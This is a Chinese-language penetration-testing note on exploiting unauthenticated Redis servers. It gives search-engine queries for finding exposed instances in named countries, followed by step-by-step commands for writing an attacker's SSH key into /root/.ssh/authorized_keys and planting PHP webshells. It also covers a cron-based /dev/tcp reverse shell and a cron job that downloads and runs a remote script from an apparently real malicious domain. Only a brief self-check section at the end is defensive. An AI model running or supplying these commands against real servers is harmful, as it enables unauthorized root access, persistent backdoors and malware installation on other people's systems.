
[10.Redis未授权访问漏洞复现与利用 - bmjoker - 博客园](https://www.cnblogs.com/bmjoker/p/9548962.html)
[未授权访问总结 | 狼组安全团队公开知识库](https://wiki.wgpsec.org/knowledge/web/unauthorized.html)

## 漏洞简介及危害
如果 Redis 配置文件 `redis.conf` 中设置了 `bind 0.0.0.0` 开放公网访问，但没有设置密码认证或防火墙规则来限制非信任 IP 访问，任何用户都可以未经授权访问 Redis 并读取数据。攻击者可以利用 Redis 的 `config` 命令进行写文件操作。


漏洞的产生条件：redis 服务对公网开放，且未启用认证。
> 1. `redis` 监听在0.0.0.0公网上
> 2. `redis` 无密码或弱密码认证，可尝试未授权访问、弱口令破解

危害：
> 1. 攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行 `flushall` 来清空所有数据；
> 2. 攻击者可通过 `EVAL` 执行 `lua` 代码，或通过数据备份功能往磁盘写入后门文件；
> 3. **最严重的情况**，如果 `Redis` 以 `root` 身份运行，黑客可以给 `root` 账户写入 `SSH` 公钥文件，直接通过 SSH 登录受害服务器



## 端口扫描
[[渗透测试-服务识别#端口扫描]]
### fofa 搜索语法
```
port="6379" && protocol="redis"
# 查找在美国范围内，运行在端口6379上且无密码的Redis实例。
port="6379" && protocol="redis" && banner="redis_version" && country="US"
```
### ZoomEye 搜索语法
```
port:6379 service:redis
# 查找在中国范围内，运行在端口6379上且无密码的Redis实例。
port:6379 service:redis +banner:"redis_version" +country:"CN"
```

### nmap 端口扫描
[nmap端口扫描 | 狼组安全团队公开知识库](https://wiki.wgpsec.org/knowledge/tools/nmap.html)

```
# 扫描目标redis info
nmap -A -p 6379 –script redis-info 192.168.1.111

# 使用 nmap 循环扫描 target_ip_range 中开放 6379 端口的 IP 地址
nmap -p 6379 --open -v target_ip_range
```

远程连接
```
redis-cli -h target_ip -p 6379
```


## 未授权访问漏洞测试
前提：攻击机程序 redis-cli 和靶机的 redis 服务可正常交互
```
root@ubuntu:/tmp/redis-2.8.17/src#/redis-cli -h 192.168.0.104
192.168.0.104:6379> ping
PONG
192.168.0.104:6379>
```
从登录的结果可以看出该 redis 服务对公网开放，且未启用认证。

### 利用"公私钥"认证获取 root 权限

通过 Redis 未授权访问漏洞，写入公钥到 `.ssh/authorized_keys`
攻击者将自己的 ssh 公钥写入服务器的 `/root/.ssh` 文件夹的 `authotrized_keys` 文件中。进而使用私钥直接登录目标服务器。

```sh
redis-cli -h <redis_ip> -p <redis_port>
config set dir /root/.ssh
config set dbfilename authorized_keys
set any_key "\n<attacker_public_key>\n"
# 如
set x "\n\nssh-rsa AAAAB3Nza... attacker@machine\n\n"
# save 或 bigsave 保存。用于创建服务器当前数据库的磁盘快照（持久化）
# `SAVE` 命令创建 Redis 数据库的磁盘快照，但会阻塞所有客户端连接，适合小型数据库。生产环境中，建议使用 `BGSAVE` 命令在后台异步创建快照，以避免服务中断。
save
```

**靶机**: `192.168.0.104`
靶机中开启 redis 服务：`redis-server /etc/redis.conf`
在靶机中执行 `mkdir /root/.ssh` 命令，创建 ssh 公钥存放目录（靶机是作为 `ssh` 服务器使用的） 

**攻击机**: `192.168.0.105`
在攻击机中生成 ssh 公钥和私钥，密码设置为空。目的是往开启了 redis 服务的靶机中写入 ssh 公钥。
进入 `.ssh` 目录：`cd .ssh/`，将生成的公钥保存到 `1.txt`：
```
root@1:~/.ssh# (echo-e"\nn";catid_rsa.pub;echo-e"nn")>1.txt
rootd1:~/.ssh# ls-a
1.txt id_rsa id_rsa.pub
```
链接靶机上的 redis 服务，将保存 ssh 的公钥1.txt 写入 redis（使用 `redis-cli -h ip` 命令连接靶机，将文件写入）：
```
root@1:~/.ssh# cat 1.txt | redis-cli -h 192.168.0.104 -x set crack
OK
root@1:~/.ssh#
```
远程登录靶机的 redis 服务：`redis-cli -h 192.168.0.104` 
并使用 CONFIG GET dir 命令得到 redis 备份的路径：
```
root@1:~/.ssh#redis-cli-h192.168.0.104
192.168.0.104:6379>C0NFIG GET dir
1）"dir"
2)）"/home/bmjoker"
192.168.0.104:6379>
```
更改 redis 备份路径为 ssh 公钥存放目录（一般默认为 `/root/.ssh`）：
设置上传公钥的备份文件名字为 `authorized_keys`：
```
192.168.0.104:6379>configset dir/root/.ssh
OK
192.168.0.104:6379>
192.168.0.104:6379>CONFIG SET dbfilename authorized_keys
OK
192.168.0.104:6379>
```
检查是否更改成功（查看有没有 authorized_keys 文件），没有问题就保存然后退出，至此成功写入 ssh 公钥到靶机：
```
192.168.0.104:6379>C0NFIG GET dbfilename
1) "dbfilename"
2)"authorized_keys"
192.168.0.104:6379>save
OK
192.168.0.104:6379> exit
root@1:~/.ssh#
```

在攻击机上使用 ssh 免密登录靶机：`ssh -i id_rsa root@192.168.0.104`
利用私钥成功登录 redis 服务器！！！


**如果权限不够**，则不能指定到如 `/etc/.ssh/`，`/root/.ssh/` 目录。
```
root@kali:~#redis-cli-h 219.153.49.228-p 48055
219.153.49.228:48055>config setdir/root/.ssh/
(error） ERR Changing directory: Permission denied
219.153.49.228:48055>
```



### 利用 redis 写 webshell
我们可以将 dir 设置为一个目录 a，而 dbfilename 为文件名 b，再执行 save 或 bgsave，则我们就可以写入一个路径为 a/b 的任意文件。

利用前提：
> 1.靶机 redis 链接未授权，在攻击机上能用 redis-cli （不需登陆验证）
> 2.开了 web 服务器，并且知道路径（如利用 phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限

通过 Redis 未授权访问漏洞，向 Redis 中写入恶意代码，然后将其保存到 Web 服务器的可执行目录中。
```sh
redis-cli -h <redis_ip> -p <redis_port>
config set dir /var/www/html
config set dbfilename shell.php
set webshell "<?php system($_GET['cmd']); ?>"
save
```
这样做会在 `/var/www/html` 目录下创建一个 `shell.php` 文件，攻击者可以通过访问 `http://<server_ip>/shell.php?cmd=<command>` 来执行任意命令。


把 shell 写入/home/bmjoker/目录下：
```mysql
192.168.0.104:6379>
192.168.0.104:6379> config set dir /home/bmjoker
OK
192.168.0.104:6379> config set dbfilename redis.php
OK
192.168.0.104:6379> set webshell "<?php phpinfo(); ?>"
OK
192.168.0.104:6379>save
OK
192.168.0.104:6379>
```
第三步写入 webshell 的时候，可以使用：
```
set x "\r\n\r\n<?php phpinfo();?>\r\n\r\n"
```
`\r\n\r\n` 代表换行的意思，用 redis 写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。

当数据库过大时，redis 写 shell 的小技巧：
```
<?php 
set_time_limit(0);
$fp=fopen('bmjoker.php','w');
fwrite($fp,'<?php @eval($_POST[\"bmjoker\"]);?>');
exit();
?>
```


### 利用 crontab 攻击
在**权限足够的情况**下，利用 redis 写入文件到计划任务目录下执行。
#### 反弹 shell
反弹 Shell（Reverse Shell）是指被攻击的主机主动向攻击者的主机发起连接，从而使攻击者能够获得目标主机的 Shell 访问权限。

端口监听:在攻击者服务器上监听一个端口（未被占用的任意端口）
```
nc -lvnp 4444
```
- `-l`：表示监听模式。
- `-v`：启用详细输出模式。
- `-p`：指定端口号。
- `-n` 禁用 DNS 解析。不会尝试将 IP 地址解析为主机名，这可以提高速度并减少不必要的网络流量。
连接 redis，写入反弹 shell
```
redis-cli -h 192.168.0.104
set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.0.104/4444 0>&1\n\n"
```

```
config set dir /var/spool/cron
config set dbfilename root
save
```
过一分钟左右就可以收到 shell

#### 计划任务注入攻击
利用计划任务（cron job）执行远程脚本。攻击者通过 Redis 命令将计划任务文件保存到系统的 cron 目录，原理同上，使用 Redis 的 `SAVE` 或 `BGSAVE` 命令将注入的计划任务持久化到磁盘。例如 `/var/spool/cron/crontabs`。

这是我从网上扫出来的某个 redis 中发现的键的值。
```



*/2 * * * * root cd1 -fsSL http://en2an.top/cleanfda/init.sh | sh


```

意图：持续控制受害者机器、下载和执行更多恶意软件，进行窃取数据或挖矿等恶意行为。

攻击过程：
```sh
# 连接到目标 Redis 实例
redis-cli -h <redis_ip> -p <redis_port>

# 设置 Redis 数据存储目录为 /var/spool/cron/crontabs
# 这个目录通常用于存放系统的计划任务文件
config set dir /var/spool/cron/crontabs

# 设置 Redis 数据库文件名为 root
# 这样保存的文件将会是 /var/spool/cron/crontabs/root
config set dbfilename root

# 设置一个计划任务到 Redis 数据库中
# 这个任务每两分钟执行一次，使用 curl 下载并执行远程脚本
set backup1 "\n\n*/2 * * * * root curl -fsSL http://en2an.top/cleanfda/init.sh | sh\n\n"

# 保存 Redis 数据到磁盘，生成 cron 文件
save

# 断开 Redis 连接
quit
```


# 自查
```
redis-cli 

# 绑定地址和端口
redis-cli CONFIG GET bind
redis-cli CONFIG GET port
# 密码保护
CONFIG GET requirepass
# 检查 Redis 数据目录和文件名
CONFIG GET dir
CONFIG GET dbfilename
```

**设置密码**

修改 `redis.conf` 中的 `requirepass`
或者从 redis 命令行
```
CONFIG SET requirepass "your_strong_password"
```
